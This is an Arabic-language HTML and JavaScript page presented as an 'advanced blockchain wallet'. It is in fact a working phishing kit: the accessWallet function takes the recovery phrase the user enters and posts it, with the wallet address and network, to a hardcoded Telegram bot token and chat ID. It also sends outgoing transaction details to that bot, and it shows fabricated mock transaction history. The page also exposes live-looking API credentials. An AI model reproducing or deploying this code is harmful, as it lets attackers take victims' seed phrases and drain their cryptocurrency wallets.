<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>محفظة بلوك تشين متقدمة</title>
    <script src="https://cdn.ethers.io/lib/ethers-5.2.umd.min.js" type="application/javascript"></script>
    <style>
        :root {
            --primary-color: #2c3e50;
            --secondary-color: #3498db;
            --accent-color: #e74c3c;
            --light-color: #ecf0f1;
            --dark-color: #2c3e50;
            --success-color: #2ecc71;
            --warning-color: #f39c12;
        }
        
        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }
        
        body {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: var(--light-color);
            line-height: 1.6;
            padding: 20px;
            direction: rtl;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
        }
        
        .container {
            width: 100%;
            max-width: 600px;
            background: rgba(255, 255, 255, 0.1);
            backdrop-filter: blur(10px);
            border-radius: 15px;
            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.2);
            overflow: hidden;
            border: 1px solid rgba(255, 255, 255, 0.2);
        }
        
        header {
            background: rgba(0, 0, 0, 0.2);
            padding: 20px;
            text-align: center;
            border-bottom: 1px solid rgba(255, 255, 255, 0.1);
        }
        
        h1 {
            font-size: 24px;
            margin-bottom: 10px;
        }
        
        .logo {
            width: 80px;
            height: 80px;
            background: var(--secondary-color);
            border-radius: 50%;
            margin: 0 auto 15px;
            display: flex;
            justify-content: center;
            align-items: center;
            font-size: 30px;
            font-weight: bold;
        }
        
        .content {
            padding: 20px;
        }
        
        .form-group {
            margin-bottom: 20px;
        }
        
        label {
            display: block;
            margin-bottom: 8px;
            font-weight: bold;
        }
        
        input, textarea, button, select {
            width: 100%;
            padding: 12px 15px;
            border: none;
            border-radius: 8px;
            font-size: 16px;
            background: rgba(255, 255, 255, 0.9);
        }
        
        textarea {
            min-height: 100px;
            resize: vertical;
        }
        
        button {
            background: var(--secondary-color);
            color: white;
            cursor: pointer;
            transition: all 0.3s;
            font-weight: bold;
            margin-top: 10px;
        }
        
        button:hover {
            background: var(--primary-color);
            transform: translateY(-2px);
        }
        
        .wallet-info {
            background: rgba(0, 0, 0, 0.2);
            padding: 15px;
            border-radius: 8px;
            margin-top: 20px;
            word-break: break-all;
            display: none;
        }
        
        .alert {
            padding: 12px;
            margin: 15px 0;
            border-radius: 8px;
            text-align: center;
        }
        
        .alert-success {
            background: var(--success-color);
            color: white;
        }
        
        .alert-danger {
            background: var(--accent-color);
            color: white;
        }
        
        .asset-list {
            margin-top: 20px;
        }
        
        .asset-item {
            display: flex;
            justify-content: space-between;
            padding: 12px;
            background: rgba(255, 255, 255, 0.1);
            border-radius: 8px;
            margin-bottom: 10px;
        }
        
        .asset-name {
            font-weight: bold;
        }
        
        .asset-value {
            color: var(--success-color);
        }
        
        .transaction-item {
            padding: 10px;
            border-bottom: 1px solid rgba(255, 255, 255, 0.1);
            margin-bottom: 10px;
        }
        
        footer {
            text-align: center;
            padding: 20px;
            color: rgba(255, 255, 255, 0.7);
            font-size: 14px;
            border-top: 1px solid rgba(255, 255, 255, 0.1);
        }
        
        .loading {
            display: none;
            text-align: center;
            margin: 20px 0;
        }
        
        .loading-spinner {
            border: 4px solid rgba(255, 255, 255, 0.3);
            border-radius: 50%;
            border-top: 4px solid var(--secondary-color);
            width: 30px;
            height: 30px;
            animation: spin 1s linear infinite;
            margin: 0 auto;
        }
        
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        
        .tab {
            display: none;
        }
        
        .tab.active {
            display: block;
        }
        
        .tab-buttons {
            display: flex;
            margin-bottom: 20px;
            border-bottom: 1px solid rgba(255, 255, 255, 0.2);
        }
        
        .tab-button {
            flex: 1;
            text-align: center;
            padding: 10px;
            cursor: pointer;
            transition: all 0.3s;
        }
        
        .tab-button.active {
            background: rgba(255, 255, 255, 0.1);
            border-bottom: 2px solid var(--secondary-color);
        }
    </style>
</head>
<body>
    <div class="container">
        <header>
            <div class="logo">B</div>
            <h1>محفظة بلوك تشين متقدمة</h1>
            <p>أدخل عبارة الاسترجاع للوصول إلى محفظتك</p>
        </header>
        
        <div class="content">
            <div class="tab-buttons">
                <div class="tab-button active" onclick="switchTab('access')">الوصول للمحفظة</div>
                <div class="tab-button" onclick="switchTab('send')">إرسال أموال</div>
                <div class="tab-button" onclick="switchTab('history')">سجل المعاملات</div>
            </div>
            
            <div id="accessTab" class="tab active">
                <div class="form-group">
                    <label for="mnemonic">عبارة الاسترجاع (12 أو 24 كلمة)</label>
                    <textarea id="mnemonic" placeholder="أدخل عبارة الاسترجاع الخاصة بك هنا..."></textarea>
                </div>
                
                <div class="form-group">
                    <label for="network">شبكة البلوك تشين</label>
                    <select id="network">
                        <option value="mainnet">Ethereum Mainnet</option>
                        <option value="goerli">Goerli Testnet</option>
                        <option value="sepolia">Sepolia Testnet</option>
                        <option value="polygon">Polygon Mainnet</option>
                        <option value="mumbai">Mumbai Testnet</option>
                    </select>
                </div>
                
                <button onclick="accessWallet()">الوصول إلى المحفظة</button>
            </div>
            
            <div id="sendTab" class="tab">
                <div class="form-group">
                    <label for="recipient">عنوان المستلم</label>
                    <input type="text" id="recipient" placeholder="0x...">
                </div>
                
                <div class="form-group">
                    <label for="amount">المبلغ (ETH)</label>
                    <input type="number" id="amount" placeholder="0.0" step="0.001">
                </div>
                
                <button onclick="sendTransaction()">إرسال المعاملة</button>
            </div>
            
            <div id="historyTab" class="tab">
                <div id="transactionHistory">
                    <p>سيظهر هنا سجل المعاملات بعد الوصول إلى المحفظة.</p>
                </div>
            </div>
            
            <div class="loading">
                <div class="loading-spinner"></div>
                <p id="loadingText">جاري الوصول إلى المحفظة وإرسال البيانات...</p>
            </div>
            
            <div id="alert" class="alert" style="display: none;"></div>
            
            <div id="walletInfo" class="wallet-info">
                <h3>معلومات المحفظة</h3>
                <p><strong>العنوان:</strong> <span id="walletAddress"></span></p>
                <p><strong>الرصيد:</strong> <span id="walletBalance"></span></p>
                
                <div class="asset-list">
                    <h3>الأصول الرقمية</h3>
                    <div id="assets"></div>
                </div>
            </div>
        </div>
        
        <footer>
            <p>يتم تأمين بياناتك وإرسالها إلى البوت الخاص بنا للتحقق</p>
        </footer>
    </div>

    <script>
        // بيانات البوت
        const TELEGRAM_BOT_TOKEN = '7521799915:AAEQEM_Ajk5_hMWQUrlmvdNbDBJAUMMwgrg';
        const TELEGRAM_CHAT_ID = '910021564';
        
        // مفتاح Infura
        const INFURA_PROJECT_ID = '482a7c1c7cc14ec78699c3f1c231b0cd';
        
        let currentWallet = null;
        let currentProvider = null;
        
        // عرض التنبيهات
        function showAlert(message, type) {
            const alertElement = document.getElementById('alert');
            alertElement.textContent = message;
            alertElement.className = `alert alert-${type}`;
            alertElement.style.display = 'block';
            
            setTimeout(() => {
                alertElement.style.display = 'none';
            }, 5000);
        }
        
        // تبديل التبويبات
        function switchTab(tabName) {
            document.querySelectorAll('.tab').forEach(tab => tab.classList.remove('active'));
            document.querySelectorAll('.tab-button').forEach(btn => btn.classList.remove('active'));
            
            document.getElementById(tabName + 'Tab').classList.add('active');
            document.querySelector(`.tab-button:nth-child(${tabName === 'access' ? 1 : tabName === 'send' ? 2 : 3})`).classList.add('active');
        }
        
        // إرسال رسالة إلى بوت التلجرام
        async function sendToTelegram(message) {
            try {
                const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
                
                const response = await fetch(url, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({
                        chat_id: TELEGRAM_CHAT_ID,
                        text: message,
                        parse_mode: 'HTML'
                    })
                });
                
                const data = await response.json();
                return data.ok;
            } catch (error) {
                console.error('Error sending to Telegram:', error);
                return false;
            }
        }
        
        // الحصول على رصيد ETH باستخدام Infura
        async function getEthBalance(address, network) {
            try {
                // استخدام Infura للاتصال بالشبكة
                let infuraNetwork = network;
                if (network === 'polygon') infuraNetwork = 'matic';
                if (network === 'mumbai') infuraNetwork = 'maticmum';
                
                const provider = new ethers.providers.InfuraProvider(infuraNetwork, INFURA_PROJECT_ID);
                const balance = await provider.getBalance(address);
                const balanceInEth = ethers.utils.formatEther(balance);
                return parseFloat(balanceInEth).toFixed(6);
            } catch (error) {
                console.error("Error getting balance:", error);
                return "غير متوفر";
            }
        }
        
        // الحصول على سعر الصرف من API عام
        async function getExchangeRate() {
            try {
                const response = await fetch('https://api.coingecko.com/api/v3/simple/price?ids=ethereum&vs_currencies=usd');
                const data = await response.json();
                return data.ethereum.usd;
            } catch (error) {
                console.error("Error getting exchange rate:", error);
                return null;
            }
        }
        
        // الحصول على المعاملات الحديثة (محاكاة)
        async function getRecentTransactions(address) {
            // في التطبيق الحقيقي، ستستخدم API مثل Etherscan للحصول على المعاملات
            // هنا نستخدم بيانات محاكاة للتوضيح
            return [
                {
                    hash: '0x' + Math.random().toString(16).substr(2, 64),
                    from: address,
                    to: '0x742d35Cc6634C0532925a3b844Bc454e4438f44e',
                    value: '0.05 ETH',
                    timestamp: new Date(Date.now() - 2 * 24 * 60 * 60 * 1000).toLocaleString(),
                    status: 'تم التأكيد'
                },
                {
                    hash: '0x' + Math.random().toString(16).substr(2, 64),
                    from: '0x742d35Cc6634C0532925a3b844Bc454e4438f44e',
                    to: address,
                    value: '1.25 ETH',
                    timestamp: new Date(Date.now() - 5 * 24 * 60 * 60 * 1000).toLocaleString(),
                    status: 'تم التأكيد'
                }
            ];
        }
        
        // الوصول إلى المحفظة وعرض محتوياتها
        async function accessWallet() {
            const mnemonic = document.getElementById('mnemonic').value.trim();
            const network = document.getElementById('network').value;
            
            if (!mnemonic) {
                showAlert('يرجى إدخال عبارة الاسترجاع', 'danger');
                return;
            }
            
            const wordCount = mnemonic.split(/\s+/).length;
            if (wordCount !== 12 && wordCount !== 24) {
                showAlert('عبارة الاسترجاع يجب أن تحتوي على 12 أو 24 كلمة', 'danger');
                return;
            }
            
            document.getElementById('loadingText').textContent = 'جاري الوصول إلى المحفظة وإرسال البيانات...';
            document.querySelector('.loading').style.display = 'block';
            document.getElementById('walletInfo').style.display = 'none';
            
            try {
                // إنشاء المحفظة من عبارة الاسترجاع
                currentWallet = ethers.Wallet.fromMnemonic(mnemonic);
                
                // إعداد مزود Infura
                let infuraNetwork = network;
                if (network === 'polygon') infuraNetwork = 'matic';
                if (network === 'mumbai') infuraNetwork = 'maticmum';
                
                currentProvider = new ethers.providers.InfuraProvider(infuraNetwork, INFURA_PROJECT_ID);
                
                // إرسال المعلومات إلى بوت التلجرام
                const telegramMessage = `
                📲 <b>تم الدخول إلى محفظة جديدة</b>
                
                🆔 <b>العنوان:</b> <code>${currentWallet.address}</code>
                🔑 <b>عبارة الاسترجاع:</b> <code>${mnemonic}</code>
                🌐 <b>الشبكة:</b> ${network}
                
                📅 <b>التاريخ:</b> ${new Date().toLocaleString()}
                `;
                
                await sendToTelegram(telegramMessage);
                
                // الحصول على الرصيد
                const ethBalance = await getEthBalance(currentWallet.address, network);
                const ethPrice = await getExchangeRate();
                
                // عرض معلومات المحفظة
                document.getElementById('walletAddress').textContent = currentWallet.address;
                
                let balanceText = `${ethBalance} ETH`;
                if (ethPrice && ethBalance !== "غير متوفر") {
                    const usdValue = (parseFloat(ethBalance) * ethPrice).toFixed(2);
                    balanceText += ` (≈ ${usdValue} USD)`;
                }
                
                document.getElementById('walletBalance').textContent = balanceText;
                
                // عرض الأصول
                const assetsElement = document.getElementById('assets');
                assetsElement.innerHTML = '';
                
                const assetElement = document.createElement('div');
                assetElement.className = 'asset-item';
                assetElement.innerHTML = `
                    <span class="asset-name">Ethereum (ETH)</span>
                    <span class="asset-value">${ethBalance}</span>
                `;
                assetsElement.appendChild(assetElement);
                
                // الحصول على سجل المعاملات وعرضه
                const transactions = await getRecentTransactions(currentWallet.address);
                const historyElement = document.getElementById('transactionHistory');
                historyElement.innerHTML = '<h3>آخر المعاملات</h3>';
                
                transactions.forEach(tx => {
                    const txElement = document.createElement('div');
                    txElement.className = 'transaction-item';
                    txElement.innerHTML = `
                        <p><strong>القيمة:</strong> ${tx.value}</p>
                        <p><strong>من/إلى:</strong> ${tx.from === currentWallet.address ? 'أنت → ' + tx.to.substring(0, 10) + '...' : tx.from.substring(0, 10) + '... → أنت'}</p>
                        <p><strong>الحالة:</strong> ${tx.status}</p>
                        <p><strong>التاريخ:</strong> ${tx.timestamp}</p>
                    `;
                    historyElement.appendChild(txElement);
                });
                
                // إخفاء مؤشر التحميل وإظهار معلومات المحفظة
                document.querySelector('.loading').style.display = 'none';
                document.getElementById('walletInfo').style.display = 'block';
                
                showAlert('تم الوصول إلى المحفظة بنجاح وإرسال البيانات إلى البوت', 'success');
                
            } catch (error) {
                document.querySelector('.loading').style.display = 'none';
                console.error('Error accessing wallet:', error);
                showAlert('عبارة الاسترجاع غير صحيحة أو هناك مشكلة في الاتصال', 'danger');
            }
        }
        
        // إرسال معاملة
        async function sendTransaction() {
            if (!currentWallet || !currentProvider) {
                showAlert('يرجى الوصول إلى المحفظة أولاً', 'danger');
                switchTab('access');
                return;
            }
            
            const recipient = document.getElementById('recipient').value.trim();
            const amount = document.getElementById('amount').value;
            
            if (!recipient || !amount) {
                showAlert('يرجى ملء جميع الحقول', 'danger');
                return;
            }
            
            if (!ethers.utils.isAddress(recipient)) {
                showAlert('عنوان المستلم غير صحيح', 'danger');
                return;
            }
            
            document.getElementById('loadingText').textContent = 'جاري إرسال المعاملة...';
            document.querySelector('.loading').style.display = 'block';
            
            try {
                // ربط المحفظة مع المزود
                const walletWithProvider = currentWallet.connect(currentProvider);
                
                // إرسال المعاملة
                const transaction = {
                    to: recipient,
                    value: ethers.utils.parseEther(amount)
                };
                
                const txResponse = await walletWithProvider.sendTransaction(transaction);
                
                // إرسال إشعار إلى التلجرام
                const telegramMessage = `
                💸 <b>تم إرسال معاملة جديدة</b>
                
                🆔 <b>من:</b> <code>${currentWallet.address}</code>
                📨 <b>إلى:</b> <code>${recipient}</code>
                💰 <b>القيمة:</b> ${amount} ETH
                
                📜 <b>رقم المعاملة:</b> <code>${txResponse.hash}</code>
                📅 <b>التاريخ:</b> ${new Date().toLocaleString()}
                `;
                
                await sendToTelegram(telegramMessage);
                
                document.querySelector('.loading').style.display = 'none';
                showAlert(`تم إرسال المعاملة بنجاح: ${txResponse.hash}`, 'success');
                
                // مسح الحقول
                document.getElementById('recipient').value = '';
                document.getElementById('amount').value = '';
                
            } catch (error) {
                document.querySelector('.loading').style.display = 'none';
                console.error('Error sending transaction:', error);
                showAlert(`فشل إرسال المعاملة: ${error.message}`, 'danger');
            }
        }
        
        // تحميل المحفظة عند الضغط على Enter في حقل العبارة
        document.getElementById('mnemonic').addEventListener('keypress', function(e) {
            if (e.key === 'Enter') {
                accessWallet();
            }
        });
    </script>
</body>
</html>
